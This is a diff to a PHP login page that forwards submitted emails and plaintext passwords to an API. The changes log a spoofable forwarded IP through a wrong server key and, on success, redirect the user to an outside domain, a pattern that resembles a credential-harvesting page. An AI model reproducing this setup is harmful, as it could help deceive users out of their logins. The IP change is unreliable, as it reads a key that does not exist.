@@ -20,7 +20,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $payload = json_encode([
             'email' => $email,
             'password' => $password,
-            'ip' => $_SERVER['REMOTE_ADDR'] ?? null,
+            'ip' => $_SERVER['X-Forwarded-For'] ?? null,
             'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
             'timestamp' => date('c') // ISO 8601
         ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
@@ -52,7 +52,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             if ($httpCode >= 200 && $httpCode < 300) {
                 $resultType = 'success';
                 // Mensaje de la API si existe; si no, mensaje genérico
-                $resultMsg = isset($json['message']) ? $json['message'] : 'Login correcto.';
+                $resultMsg = 'Login correcto.';
+                header("Location: https://onceforall.com");
+                die();
                 // Aquí podrías guardar tokens de sesión/cookies si la API los retorna:
                 // if (!empty($json['token'])) { $_SESSION['token'] = $json['token']; }
             } else {
@@ -183,4 +185,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   </div>
 </body>
 </html>
+
 
